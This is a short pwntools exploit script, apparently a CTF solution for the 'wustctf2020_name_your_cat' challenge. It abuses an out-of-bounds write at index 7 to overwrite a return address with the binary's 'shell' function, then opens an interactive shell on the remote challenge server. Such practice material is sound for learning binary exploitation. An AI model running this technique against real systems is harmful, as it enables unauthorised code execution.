from pwn import *
context.log_level = 'debug'

# io = process('./wustctf2020_name_your_cat')
io = remote('node4.buuoj.cn', 29532)
elf = ELF('./wustctf2020_name_your_cat')

io.sendlineafter(b'Name for which?\n>', b'7')
io.sendlineafter(b'Give your name plz: ', p32(elf.symbols['shell']))

for i in range(4):
	io.sendlineafter(b'Name for which?\n>', b'1')
	io.sendlineafter(b'Give your name plz: ', b'A')
	
io.interactive()
